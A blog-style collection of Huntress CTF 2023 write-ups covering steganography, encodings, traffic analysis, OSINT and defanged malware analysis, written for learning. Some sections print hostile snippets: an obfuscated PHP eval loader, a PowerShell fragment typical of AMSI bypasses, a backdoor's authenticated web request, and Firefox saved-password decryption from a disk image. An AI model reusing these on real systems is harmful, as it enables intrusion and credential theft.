# Huntress CTF 2023

## Intro
These are my write ups for the Huntress CTF 2023 challenges. I've already finished a few of the beginner challenges, so I'll go ahead and sum them up, but they may not be as detailed as the rest. The CTF runs the entire month of October, but the challenges are released in batches once a day.

When the challenge is over, I'll update the results section with my standing

## Results
10/6 @ 10:15AM (Mountain) - 89th Place
10/7 - 17th Place

## Challenges

### Read the rules
>**Prompt:** Please follow the rules for this CTF!

I accidentally found this one before realizing there was a challenge related to the rules. When I first created my account, I went to the rule page to make sure I didn't miss anything. In the rules it states that there is a flag hidden somewhere on the page. 

After reading through the rules, I hadn't found it, so I viewed the page source and found it hidden as a comment there.

### Technical Support
>**Prompt:** Want to join the party of GIFs, memes and emoji shenanigans? Or just want to ask a question for technical support regarding any challenges in the CTF?  
This CTF uses support tickets to help handle requests. If you need assistance, please create a ticket with the #ctf-open-ticket channel. You do not need to direct message any CTF organizers or facilitators, they will just tell you to open a ticket. You might find a flag in the ticket channel, though!

This one was pretty easy. It's just an introductory flag to teach the contestants how to use the technical support system. 

To get it, just join the discord, verify you are human by reacting to the rules with the specified emoji. This will allow you to see the other pieces of the discord, if you enter the technical support channel, you will see the flag.

### String Cheese
>**Prompt:** Oh, a cheese stick! This was my favorite snack as a kid. My mom always called it by a different name though...

Because it's a picture, I figued it was going to be some kind of steganography. So I broke out steghide.

I ran `steghide --extrac -sf cheese.jpg` which prompted me for a password. I obviously didn't have one. Thinking there might be some sort of hint in the prompt, I returned to the website and read it again. The author mentions that their mom used a different name for cheese sticks. This seemed like it might be a hint so I started trying other names like: string, string cheese, etc. I didn't have any luck with this, so I looked online for other names but couldn't find anything I hadn't already tried.

My next idea was to look for passwords or flags in the metadata. Using `exiftool cheese.jpg` I was able to view a lot of info, but there was nothing that stood out.

Finally, I used `xxd cheese.jpg` to view the hex dump for the file. Hidden in the seeming jumble of characters, I foudn the exif data, and right above it was the flag.

### Notepad
>**Prompt:** Just a sanity check... you do know how to use a computer, right?

This one was very straight forward. I downloaded the file and opened it in notepad. The flag was there in plaintext.

### Book by its Cover
>**Prompt:** They say you aren't supposed to judge a book by its cover, but this is one of my favorites!

The file downloaded for this challenge was a .rar file. My first instinct was attempt to extract the contents. When I tried that, I got an error basically saying that the file was not supported. This, along with the title of the challenge, made me think that it was just mislabeled as a .rar.

I ran `file book.rar` to find out what it really was. Turns out it was actually a .png. So I changed the file extension and opened it in an image viewer. The image was of the flag.

### Query Code
>**Prompt:** What's this?

My first move was to `cat query_code` but this jsut output a bunch of gobbledygook.

So then I used `file query_code` to see if I could learn anything else about it. It seems to think that this is a .png.  As in the 'Book by its Cover' challenge, I tried changing the file to a .png and opening it with an image viewer. I found a QR Code! 

Using my phone, I scanned the QR code to get the flag. (Note: this is a security company and I figured I could trust their QR code, but it's probably not a good idea to scan unknown QR codes in the wild.)

### BaseFFFF+1
>**Prompt:** Maybe you already know about base64, but what if we took it up a notch?

The prompt seems to allude to decoding the file using another base. Probably BaseFFFF+1. 

FFFF in hexadecimal = 65535 in decimal. 65535 + 1 = 65536. So I think we are boing to decode using 65536. Now I just needed to find out how to decode with that base.

Online, I found [this repository](https://github.com/Parkayun/base65536) that somebody creatd to encode & decode base65536 using python. After installing this with pip, I wrote this small python script to decode our file:

```
import base65536

file = open("baseffff1","r")

toBeDecoded = file.read()

print(base65536.decode(toBeDecoded))
```

This gave me this message (flag redacted of course):
`b'Nice work! We might have played with too many bases here... 0xFFFF is 65535, 65535+1 is 65536! Well anyway, here is your flag:\r\n\r\nflag{INSERT_FLAG_HERE}'`

### Traffic
>**Prompt:** We saw some communication to a sketchy site... here's an export of the network traffic. Can you track it down?  
Some tools like rita or zeek might help dig through all of this data!

Looks like we're analyzing network traffic. I was thinking I could just use wireshark which I'm comfortable with, but it's not the right file type. The prompt suggests using Rita or Zeek.

I chose to try Rita.

Rita stands for Real Intelligence Threat Analytics and is a framework to analyze network traffic to look for malicious traffic.

The hardest part of this challenge was setting up Rita in WSL. I'll go over those steps since that's what took the longest.

1. Download the [repo](https://github.com/activecm/rita.git) from GitHub
2. If  you are on supported OS use the install.sh script to install `sudo ./install.sh` Theoretically you could use --disable-zeek to save some time.
3. WSL is kind of supported for debian. You will see an error about systemd not being usable or something. This is becuase WSL uses some other mechanism. We'll get past this issue in a minute.
4. Modify /etc/rita/config.yaml to include the correct address for your local subnet

If you try to use rita import \<log directory\> at this point, you will get and error saying the databases can't be reached. This is because MongoDB could not be setup to automatically run.

5. Run `sudo mongod` to start the MongoDB server. (Put in background or open another terminal)
6. Now run `rita import \<log directory\> \<name of new DB\>`

It should now work, the logs will be analyzed (Note rita can handle the .gz files so no need to extract them)

7. `rita html-report \<name of DB\>`

You can now view the html report by opening the generated index.html file in your browser.

The trick to this CTF is to look through each line searching for  "sketchy site". In the "Beacons SNI" tab of the report you can see the website names and looking through the list we see "sketchysite.github.io".

Going to this site produces the flag

### CeaserMirror
>**Prompt:** Caesar caesar, on the wall, who is the fairest of them all?  
Perhaps a clever ROT13?  
NOTE: this flag does not follow the usual MD5 hash standard flag format. It is still wrapped with the code>flag{} prefix and suffix.

The prompt here gives the hint that it is a clever ROT13. So I took the contents of the file and dropped them into CyberChef, chose ROT13, and baked it.

The output was half readable, but the other half was backwards. Rather than try to flip the text to make it easier to read, I just started to read it backwards.

You have to start with the firts forward-facing line, and when you get to the backwards piece, start reading from the very end. It's kind of a fun exercise, if a little slow going. The flag has been split into three parts and the parts in the backwards text will have to be reversed in the actual flag.

### I Won't Let You Down
>**Prompt:** OK Go take a look at this IP:  
Connect here: http://155.138.162.158 # USING ANY OTHER TOOL OTHER THAN NMAP WILL DISQUALIFY YOU. DON'T USE BURPSUITE, DON'T USE DIRBUSTER.

Okay, so this one took me much longer than it should have. I went to the website and watched the video. The website basically tells you to use nmap. So I did that and found 4 ports open:

```
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
646/tcp  filtered ldp
8888/tcp open     sun-answerbook
```

The first 3 look normal to me, and I know the CTF said don't use ssh. So my immediate thought was to try going to port 8888. It didn't load in the browser, or at least it just spun, so I decided to try to just use curl. 

Curl gave me an error saying http 0.9 isn't allowed. When I looked this error up, I found people saying to check if wget gave you more. 

When I ran wget on that port, it started fetching an html file. I let this download for a while before I decided it was probably just spinning. But when I checked the html file I had pulled down, it contained the lyrics to the song and at the very end the flag.

### Zerion
>**Prompt:** We observed some odd network traffic, and found this file on our web server... can you find the strange domains that our systems are reaching out to?  
NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.  

This is the first "Malware Analysis" challenge of the competition and I'm pretty excited. I haven't done much malware analysis to this point, but it's always been something I'm super interested in.

So I downloaded the file onto my VM and then cut the network to it to make sure I was being at least a little safe. There was a warning in the challenge that this is based on a real malware sample that they have defanged, but they still urge us to use caution. I think that is so cool.

So my first step was to run `file` on the file to see what it actually is. It's a php script. 

I then used `cat zerion` to find out what is in the script to see if I can find out what they are doing. This returned a massive jumble of characters that started with this a intelligible text:

```
<?php $L66Rgr=explode(base64_decode("Pz4="),file_get_contents(__FILE__)); $L6CRgr=array(base64_decode("L3gvaQ=="),base64_decode("eA=="),base64_decode(strrev(str_rot13($L66Rgr[1]))));$L7CRgr = "d6d666e70e43a3aeaec1be01341d9f9d";preg_replace($L6CRgr[0],serialize(eval($L6CRgr[2])),$L6CRgr[1]);exit();?>
```

This was followed by the seemingly gobbledygook. I have left it out since it's partly real malware. But we'll come back to it soon.

I recognized a few things right off the bat: the php heading, a couple of variables, some encoding, etc.

I broke it into it's variables to decipher what is going on.

$L66Rgr is pretty easy to decipher. It's creating an array from a string using the explode function, the delimeter is just encoded in base64 but it turns out it is "?>". The string to be broken is loaded using file_get_contents and is using this php file. So it's grabbing that log string of gobbledygook.

$L6CRgr is an array. The first two entries are just base64 encoded as well so quickly decoded to be /x/i, and x. The last entry was a little more fun. It's a combination of a few different obfuscation techniques.

`base64_decode(strrev(str_rot13($L66Rgr[1])))`

So it's referring back to the gobbledygook. I dropped it into cyberchef and then worked backwards on obfuscation methods. Rot13 -> reverse order -> base64 decode. Now I see it is actually a rather large chunk of code.

$L7CRgr is just a string. Nothing special there yet. I'm sure we'll get to using it.

Then the script calls `preg_replace($L6CRgr[0],serialize(eval($L6CRgr[2])),$L6CRgr[1]);` before finishing.

This referes back to our previous work. preg_replace is a php function that uses a pattern to serach and replace a string. It is case-insensitive. And is called like so:

`preg_replace(<Pattern>,<Replacement String>,<String to act upon>)`


So the pattern we are searching for is the first entry of $L6CRgr which is /x/i  
We are replacing it with the serialized version of the gobbledygook (evaluated as php code), and the string to be replaced is x. Interesting. I'm not exactly sure what this will do, because from what I can tell it's replacaing things in string 'x' which doesn't exist. At least not that I can see at this point. Maybe I'll come back to it.

Coming back to $LCRgr, I see it in the php function that we have already decoded, so I drop it's value in.

Then I just have to decode the php function I have found.

For my sanity, I like to start out by making the code more readable by stylizing it. I just go through and add returns and indents in ways that make sense for reading softare. For example, after a semi-colon, there will be a return, curly brackets should be lined up with the corresponding bracket, etc. 

As I went through the code doing this, I stumbled across the flag!


### HumanTwo
>**Prompt:** During the MOVEit Transfer exploitation, there were tons of "indicators of compromise" hashes available for the human2.aspx webshell! We collected a lot of them, but they all look very similar... except for very minor differences. Can you find an oddity?  
NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.

First step here for me was unzipping into another directory.

It's 1000 files all with giant names. They all look very similiar. Using the diff command, I can see that in all the files I checked there is just one difference. Basically a string in each. Maybe an ID or soemthing.

However, the prompt states that they are mostly the same except for a few oddities. So decided I needed a simple script that basically takes all the files in the directory and compares them to the first. Becuase I'm in a bit of a hurry, I decided to practice my prompt engineering skills and let ChatGPT generate this script for me:

```
#!/bin/bash

# Check if a directory is provided as an argument
if [ $# -ne 1 ]; then
    echo "Usage: $0 <directory>"
    exit 1
fi

directory="$1"
files=("$directory"/*)

# Check if the directory is empty
if [ ${#files[@]} -lt 1 ]; then
    echo "Directory is empty."
    exit 1
fi

# Get the first file in the directory
first_file="${files[0]}"

# Loop through each file in the directory
for file in "${files[@]}"; do
    # Compare the current file with the first file using diff
    diff "$first_file" "$file"
    # Add a separator between comparisons
    echo "----------------------------------------"
done
```
kt
I read throught the script to make sure it would do what I wanted it to and ran it. The output from this script was quite large, but scrolling through I did find an oddity.

```
if (!String.Equals(pass, "666c6167-7b36-6365-3666-366131356464"+"64623065-6262-3333-3262-666166326230"+"62383564-317d-0000-0000-000000000000")) {
134c134
```

This was found in the cc53495bb42e4f6563b68cdbdd5e4c2a9119b498b488f53c0f281d751a368f19 file (line 36).

So I opened that file to investigate to see if I could find out what was happening there. But that didn't seem like it was very much of a lead. So instead I started to think more about the numbers that are there.

Could they be encoded? Are they related to the other files? Maybe they correlate to the ID's that I found earlier. I grep'd through the files searching for each of these ID looking things, but to no avail.

Okay, so that leaves my encoded idea. I took one of the values out and through it cyber chef. I noticed it had low entropy, but it didn't immediately give me any valuable decoding. It didn't look like base64 to me, but I tried that anyway. Didn't work. Finally, I realized that maybe if I followed the string concatenation in the script it would give me a better picture. So I concatenated them all together to get:

`666c6167-7b36-6365-3666-36613135646464623065-6262-3333-3262-66616632623062383564-317d-0000-0000-000000000000`

For whatever reason, after I did this, I realized the pattern looked somewhat familiar. Particularly the small blocks, looked kind of like hex to me, so I decoded it from hex on cyber chef and found the flag followed by a bunch of null characters.

### Hot Off the Press
>**Prompt:** Oh wow, a malware analyst shared a sample that I read about in the news!  
But it looks like they put it in some weird kind of archive...? Anyway, the password should be infected as usual!  
NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.

Another malware analysis challenge, yay! 

The challenge prompt mentions it is some kind of weird archive but I figure I need to start out just like I did with Human2, that is extracting it from the archive so I could view it's contents. The question is what kind of archive is it. Using `file` I found that it was a UHarc archive. I had no idea what that was so I went and looked it up. Apparently it's another compression (.uha) that was designed for windows. So I now need to find a program to decompress this format, but my VM is not a Windows VM. My research showed that basically I would have to use a decompression client using Wine. But I didn't want to go to all that work so I just created a shared directory between a Windows machine and my Linux VM where I wanted to do the rest of the work. This way I could extract it and share the file then remove the shared folder to keep my VM isolated.

I searched the web and found WinUHA which can extract .uha files. But when I went to extract hot_off_the_press it wouldn't work. Turns out the program was just looking for a .uha file, so I added teh file extension myself. Then the program could extract it using the password given in the prompt. I ended up with a powershell script. At this point Windows Defender started going crazy becuase it found the extracted Trojan. I had to tell Windows Defender that the thread was allowed before I could do anythign with it. After allowing it, I moved it to my VM and and disconnected the access. Then I went back to defender and told it to remove the threat, after which I uninstalled WinUHA and ran a scan just for good measure.

Okay, now that the extraction work was over, I had a powershell script safely in my VM. Time to start analyzing.

As with the other Malware Analysis we've done so far in this challenge, I started by working through the code to make it readable for my sake. Fixing returns and indents so that it wasn't all on one line. Once I had those figured out. I noticed there was a lot of concatenation. So I worked through adding that together with a simple search and replace ''+'' to nothing. Now I can see partial words. they are often broken up like this example for further obfuscation:

`$jXZ4D=[Ref].Assembly.GetType(((''{0}ystem.{1}ana{4}ement.A{5}tomation.{2}ti{3}s'')-f''S'',''M'',''U'',''l'',''g'',''u''));`

In these cases, the letters after the phrase correspond to their own placement number. So in the line above, {0} = S, {1} = M, {2} = U, {3} = l, {4} = g, {5} = u. The -f is just the flag to make this substitution.Once I found this,I went and simplified my readable code by replacing them as necessary. As I was going through doing this. I found a long base64 string that would be decoded on execution. It contained a few of these substitutions, so I copied it out so I had that string alone and used find and replace to fix the substitutions. There were just about 50 substitutions, so this was the fastet way.

I then dropped this newly deobfuscated base64 string into CyberChef base64 decoder but still didn't get anything readable. Looking back at the powershell script, I notice that it is actually a gzip stream. I didn't know you could do this, but I suppose it makes sense. Essentially, what is happening is that we are decoding to a gzip, so if we unzip it we get the readable output. I used

`echo '<Input Base64 Here>' | base64 -d | gunzip`

and got a ton more code. I was going to go through the same readability steps I normally do, but I figured I could just scan for any flags, or base64 encoded strings. I didn't find a flag, but I did find another base64 encoded string. Decoding it gave me a URL with a parameter encoded_flag=\<Percent Encoded String\>. I had a suspicion that this was probably the flag, so I dropped the encoded string into CyberChef and used URL Decode to decoded the percent encoded values. And, as I suspected, it was the flag.

### Dialtone
>**Prompt:** Well would you listen to those notes, that must be some long phone number or something!

The prompt and name here suggest that the .wav file contains dial tones. Searching online I found a python repository called [dtmf](https://github.com/ribt/dtmf-decoder.git) that takes a .wav file containing dialtones and translates them to numbers.

I got a very long string of numbers out. The next step I knew would be to decode it somehow, it was just a matter of finding how. 

I was pretty sure it wasn't base64 since it was just numbers but I tried it anyway. As I suspected that didn't work. I just started to move through al sorts of decoders with no results. Finally, I tried to treat it as a bigInt as if it was in Java. So I found a quick Java function online that converted a big int to hexadecimal. Then I converted the hexadecimal back to it's raw value and got the flag.

### PHP Stager
>**Prompt:** Ugh, we found PHP set up as an autorun to stage some other weird shady stuff. Can you unravel the payload?  
NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.

I started this malware sample as I always do, making it readable.

After doing this I found some easy variable substitutions, a function, and a giant string of seemingly random values.

The variable substitutions after the giant block of text led me to find two new variables. They were constructed by taking the character at the specified value.

So afte the first variable substitution I had:
```
foreach([24,4,26,31,29,2,37,20,31,6,1,20,31] as $k){
   $fsPwhnfn8423 .= ")o4la2cih1kp97rmt*x5dw38b(sfy6;envguz_jq/.0"[$k];
```

Following the numbers in k this ended up being: "base64_encode". 
I also did this to get "strrev" for another variable. I then substituted this to get a "create_function".

After all those variable substitutions I got:

```
$c = create_function("/*XAjqgQvv4067*/", base64_encode( deGRi(base64_encode($gbaylYLd6204), "tVEwfwrN302")));
```

Where "$gbaylYLd6204" is the huge block of text.

`deGRi` is a function that is created at the top that takes two strings and iterates over them taking the XOR of two characters. So basically, this function decodes the huge block of text for us.

This is where things got really tricky for me. I had to find a way to get the decoded text block. I was close, but it was going to be a very long decode process by hand. My choices were write a script, or run the create_function to get out the text.

Well, I decided running it would be best. So what I did is I copied the entire php program into a php sandbox online, removed the final run statement, and added `echo($fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), "tVEwfwrN302")));`
which i knew would print out the decoded block of text.

(Note: create_function was removed in php8, so I had to find a sandbox that would allow me to run php7)

This ended up being a perl script and it was very long. I started looking through and noted a password as well as some base64 encoded values. Those are always suspicious in a CTF so I decoded them and found some more scripts. Probably to run a webshell.

But within one of those base64 strings, I saw another kind of encoding for a smaller string. Something called uuencode. I hadn't heard of this before, but I figured they were telling us what it was encoded with so I might as well try. I dropped it into dcode and found the flag.

### Layered Security
>**Prompt:** It takes a team to do security right, so we have layered our defenses!

To start, I wanted to find out what the downloaded file for this challenge was, so I first ran `file` on it. This told me that it was likely a GIMP image. I figured I would need GIMP so I started it downloading.

While it was downloading and installing, I went ahead and did a few othe quick checks. I ran `strings | grep flag` to see if there was just something easy hidden in it somewhere. No luck there. I then tried exiftool to get some more of its data, but I didn't see anything there.

Finally I opened GIMP. I found there were a bunch of photos layered on top of each other. That makes sense for the name. I disabled layers one-by-one, starting at the top, and when I got about half way through, there was a picture that contained the flag.

### Backdoored Splunk (17th Person to Solve)
>**Prompt:** You've probably seen Splunk being used for good, but have you seen it used for evil?  
NOTE: the focus of this challenge should be on the downloadable file below. It uses the dynamic service that is started, but you must put the puzzle pieces together to be retrieve the flag. The connection error to the container is part of the challenge.

According to the prompt, the downloaded file for this challenge was a malicious version of splunk.

They also gave us a link to a web address. When the address was visited it just displayed an error that said `{"error":"Missing or invalid Authorization header"}`. I was pretty sure it was just a matter of finding this authorization header.

My first thought was to just start searching through all the folders in the download for a flag following the format for this CTF. So I searched for "flag{". No luck there. 

But while I was in the code, I thought to look for the header. I knew that the program had to reach out to that website to give it the header, so I just searched the code for the web address: `chal.ctf.games`. I left off the port because I figured this would be specific enough.

My search found the address in a powershell script:

```
$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
```

Checking this base64-encoded string was the next logical step. It confirmed my thought process:

`backdoor:use_this_to_authenticate_with_the_deployed_http_server`

So now I just needed to send that header with my request. I had never done this before without using BurpSuite, but since that isn't allowed for this CTF, I started searching for other options. I tried a few chrome extensions that didn't seem to work, or I couldn't get them to work.

Meanwhile the site got DDoS'd by all the traffic people were sending at it. So while the maintainers figured out the issue, I started thinking about other ways to send the request.

In the end, what I did was just use the powershell script to invoke a request. I took the request from the code, hard-coded in the port number and dropped it into powershell:

```
Invoke-WebRequest http://chal.ctf.games:31106 -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing
```

This is the returned response (flag redacted):

```
StatusCode        : 200
StatusDescription : OK
Content           : <!-- <Base64-Encoded Flag was Here> -->
RawContent        : HTTP/1.1 200 OK
                    Content-Length: 69
                    Content-Type: text/html; charset=utf-8

                    <!-- <Base64-Encoded Flag was Here> -->
Forms             :

InputFields       : {}
Links             : {}
ParsedHtml        :
RawContentLength  : 69
```

I went ahead and decoded the content from base64 and got the flag.

### Comprezz
>**Prompt:** Someone stole my S's and replaced them with Z's! Have you ever seen this kind of file before?

My immediate thought was that we were going to have to edit the hex of the compressed file to change back all Z's to S's.

But before I did that, I ran `file` on it and foudn it was a 16 bit compress'd file.

Then I used hexedit to change the one Z to an S.

I had to google how to uncompress this type of data, but it turns out it was just `cat comprezz | uncompress`. That returned a partial flag, but it was apparently corrupted.

So I reverted the file to its original format and ran the uncomppress again. This gave me the flag. Guess I just overthought the challenge.

### Dumpster Fire
>**Prompt:** We found all this data in the dumpster! Can you find anything interesting in here, like any cool passwords or anything? Check it out quick before the foxes get to it!

I started by unzipping the .tar.xz file that was given to us. It apparently is a system image of some sort.

My first instinct was to run some grep commands since there were so many files to look through. I ran these

`grep -rn flag{` - To check for an easy flag
`grep -rn ==\"` - To check for any base64 encoded files

The first command found nothing. Not surprising.
The second command though found 

```home/challenge/.mozilla/firefox/bc1m1zlr.default-release/logins.json:1:{"nextId":2,"logins":[{"id":1,"hostname":"http://localhost:31337","httpRealm":null,"formSubmitURL":"http://localhost:31337","usernameField":"username","passwordField":"password","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECPs50spbp6eyBAi0aCUHIntLPA==","encryptedPassword":"MFIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECEcjS+e6bXjFBCgCQ0p/1wCqPUmdgXdZWlohMXan4C3jD0bQgzsweyVEpAjJa+P9eOU4","guid":"{9a363712-620c-499a-bb7d-999b8b2515dc}","encType":1,"timeCreated":1604703907434,"timeLastUsed":1604703907434,"timePasswordChanged":1604703907434,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}```

Looking back at the prompt, we see we are looking for a password and it appears the second half of the hint about foxes was referring to this Mozilla directory.

I now just had to find a way to decrypt this thing. I googled "firefox password cracker" and found [this repo](https://github.com/unode/firefox_decrypt) which contains a firefox password decryptor.

It was pretty simple to use. I just had to pass it the directory I found the passwords in using this command: `/home/dballif/Tools/firefox_decrypt/firefox_decrypt.py ~/HuntressCTF/home/challenge/.mozilla/firefox/bc1m1zlr.default-release`

And it returned:

```
2023-10-08 07:53:03,196 - WARNING - profile.ini not found in /home/dballif/HuntressCTF/home/challenge/.mozilla/firefox/bc1m1zlr.default-release

```

Pretty interesting. [Here](https://medium.com/geekculture/how-to-hack-firefox-passwords-with-python-a394abf18016) is a link to a blog post about what is happening underneath and why it's pretty scary.

A quick excerpt: "The username and password are encrypted using PKCS #11 cryptography standard which uses your device as a “cryptography token” for encryption and decryption." So since Firefox is using your device as the token, as long as you have a dump of the system (as in this challenge) or access to the system you could do this. 

(The author also has an [article](https://ohyicong.medium.com/how-to-hack-chrome-password-with-python-1bedc167be3d) for a similiar Chrome problem)

For good measure, I ran this firefox tool on my own passwords just to practice. That's cool. And conerning.

### Chicken Wings
>**Prompt:** I ordered chicken wings at the local restaurant, but uh... this really isn't what I was expecting...

To solve this one, I ran `file` on it to see if it was anything special. It was just some sort of UTF-8 format. Opening it in the terminal wasn't doing me any good. When I opened it in a file editor. I realized it was the font "Wingdings". I dropped it into a translator and got the flag.

### Where Am I
>**Prompt:** Your friend thought using a JPG was a great way to remember how to login to their private server. Can you find the flag?

Seeing that it was a .jpg, the first thing I did was run `exiftool` on it. I looked through all the meatadata for the image and I noticed that in the description field, there was a string that looked like it might be base64. I decoded it using `echo "INSERT BASE64 HERE" | base64 -d` to get the flag.

This could also be solved by openign the properties of the picture in Windows, and going to the details tab.

### Wimble
>**Prompt:** "Gretchen, stop trying to make fetch happen! It's not going to happen!" - Regina George, Mean Girls

This one was new to me. When I unzipped the file for the challenge, I found it was a Windows Image File. Basically another archive containing an image taken from windows. I extracted that archive so I could look through it.

There were a lot of files here, and I didn't really know what any of them were.

I see a lot of .pf files and another .zip file.

It looks like the .pf files are related to various .exe files based on their titles. I decided I needed to find out what they were. .pf stands for "Prefetch". From what I read, these files are created the first time any .exe is run, and they contain important pieces of data that help the OS start them faster. That's pretty high level, but I think it's good enough for us.

So now that I knew what they were, I had to find out how to search through them. My guess is that the flag is hidden inside one of them, but it could be in the zip.

Time for more research. I eventually found [PECmd](https://ericzimmerman.github.io/#!index.md) a tool written by Eric Zimmerman that parses prefetch files. All I had to dow was pass it the directory where I extracted them all and it would look through them all, sending them to a file of my choosing. Then I could just searc for a flag.

`Downloads\PECmd -d Downloads\fetch~\fetch >> pf.out.txt`

I moved it to my WSL instance to grep because I know how to use that one off the top of my head.

`cat pf.out.txt | grep flag{`

This did turn up the flag for me.

### F12:
>**Prompt:** Remember when Missouri got into hacking!?! You gotta be fast to catch this flag!

Starging this link displays a button, when you press it, another window appears for a second and then disappears. I assume the flag is goign to be in this window somewhere.

However, you get a very small portion of the window. My first thought was that I would actually just have to be really fast and resize the window. I tried this a few times before I realized it was futile.

So then I tried right clicking on it quickly, hoping I could get the page source. But that didn't work either.

So finally I inspected the main page source to see what it was doing. When the button was clicked, it would call a JS function that would open `"./capture_the_flag.html"`. So, I navigated to that website manually where was a big green square where the flag should have been. But it wasn't there, so I viewed that page source too and found the flag hidden under a bunch of blank lines.

### VeeBeeEeee
>**Prompt:** While investigating a host, we found this strange file attached to a scheduled task. It was invoked with wscript or something... can you find a flag?  
NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.

Anothe malware challenge, this time it is using something called wscript. I'm not super well versed in windows tools, so I didn't know what this was right away. I looked it up though and it appears just to be a tool to run different kinds of scripts.

I opened up the file to see if I could see anything. It's looking pretty encrypted or something. However, I did notice there are two cases of ==, one at the start and one at the end. Each with some characters before or after. Maybe some kind of tag or id. I don't know yet. I kept looking around and found that these tags were indicators that it is an endoed vbs script (aka .vbe). I looked online and found (John Hammond's decoder)[https://github.com/JohnHammond/vbe-decoder.git].

Using this converted it to mostly readable. There were a few strings and characters I had to clean up.

First I found and replaced all instances of `''''''''''''''''al37ysoeopm'al37ysoeopm` with nothing. That made it a lot easier on the eyes. 
Then I found and repalced all instance of ampersand(`&`) with nothing. This made the variables readable. 

Then I just had to combine multiple variables to see what the script was doing. I didn't immediately notice a flag or any base64 encoded text, but I did see a `InvokeWebRequest` that was grabbing a file from Pastebin. So I followed the Pastebin link and found the flag.

### Baking
>**Prompt:** Do you know how to make cookies? How about HTTP flavored?

When I visited the website that came along with this challenge, it brought me to a giant oven with various recipe buttons I could press. When I clicked them, it would set the time. According to the page source, this time was based in some way off the current time. 

The last recipe, `magic cookies` seemed suspicious in thre parts.
1. It was called magic cookies instead of just cookies
2. The timer would set to 119 hours which seemed very unreasonable
3. The prompt calls out cookies

I couldn't find a way to edit this time initially, until I realized the prompt was pushing me towards looking at the cookies.

I opened `Chrome Dev Tools > Application > Storage > Cookies` and sure enough there was a cookie there containing three fields.

The first and third I did not recognize, but the second was called `in-oven` and contained this base64 encoded string: `eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEwLzExLzIwMjMsIDAxMzoxMzowMCJ9==`

When I decoded this, it became `{"recipe": "Magic Cookies", "time": "10/11/2023, 013:13:00"}`.

So it appears this cookie was telling me how long my oven had left to bake those magic cookies. I edited this field to be ten days ago so that the timer would expire, re-encoded the value, put it into the cookie and refreshed my page. A popup with the flag appeared.

**Note:** I tested afterwards to see if I had to use "Magic Cookiess" and this is the case. The others will display a popup, but there will be no flag.


### Operation Not Found
>**Prompt:** In the boundless web of data, some corners echo louder than others, whispering tales of innovation, deep knowledge, and fierce competition. On the lush landscapes of https://osint.golf/, a corner awaits your discovery... where intellect converges with spirit, and where digital foundations stand alongside storied arenas.

Click and place your pin-marker on the map where you believe your exact location is. The accuracy radius is 200 meters.  
Click Submit. If you are incorrect, it will say "not here" on the top left. If you are correct, your flag will be displayed in the top-left corner.  
Copy and paste the flag value into the input box below and submit it to solve this challenge!  

I liked this challenge. I'm not sure how to write this one up very well, so I'll just share some of my observations and how they helped me find the right answer.

The first identifying information I saw was a sign for "Brasfield & Gorrie". It looked to be a construction company. I looked them up on google and found they are indeed a construction company based out of Alabama. This plus the fact that everything is in English is a good indicator we are in the US somwhere. But the company also notes they work around the country so I may not be in Alabama.

Looking around, there are only a few othr things that stick out to me. First, there are some tall buildings, like skyscrapers. Second, we appear to be near a stadum of some sort. Three, there are lots of young people with backpacks.

Based on these observations, I think we're in at least a decent sized city since there are skyscrapers. Based on the youg people, their backpacks and a stadium, I think we are at some college. The more I look the more I think this is true, the buildings have that feel and it looks liek a well maintained campus.

At this point, I checked a few colleges in Alabama, but didn't see any tall buildings, so that didn't seem right.

I came back to the picture and noticed that two of the possible students are wearing yellow & black stripes. I figured this was a good sign that it was the school colors. After some searching, I found a few possible candidates that used that color. For each, I went to a map of their school and checked around the stadium.

I eventually found it was Georgia Tech, by seeing some one way streets near the stadium.

After the fact, I noticed in the picture that I could see their Logo on one sign, but it was pretty blurry, so without a little push in that direction I don't think I would've been able to recognize it.

### Snake Eater
>**Prompt:** Hey Analyst, I've never seen an executable icon that looks like this. I don't like things I'm not familiar with. Can you check it out and see what it's doing?

This was took me too long. The malware in question was a .exe, which I hadn't analyzed before. My first thought was to drop it into Ghidra, and decompile it to try to figure out what it was doing.

I played around with that for quite a while, but it turns out I need a lot more practice with Ghidra becuase I didn't understand how to use it very well. Making a note to go learn this.

So I went back to the start. I ran `file` on it to ensure it was actually an exe, which it was. Then I ran `strings` on it to see if the flag was just hidden in plain sight. It wasn't, but I did notice that it was built from python3-11.

So I went online and found a python decompiler that gave me a .pyc file. This was essentially just byte code. I searched around github to find `pycdc` which should have been able to decode the byte code, but I kept getting errors. I tried multiple decompilers with that same.

Eventually, I downloaded Procmon, and ran the sample while capturing. There was a lot to sort through. I used the search function to find `flag{` and procmon highlighted one event. Turns out the sample was creating a file that contained the flag in its name.

### Opendir
>**Prompt:** A threat actor exposed an open directory on the public internet! We could explore their tools for some further intelligence. Can you find a flag they might be hiding?

Also, don't forget to login opendir:opendir.

Okay, so my first instinct here was to just start looking thorugh all the different directories to see if there were any suspipciously named files or directories. A quick glance didn't reveal anything especially promising.

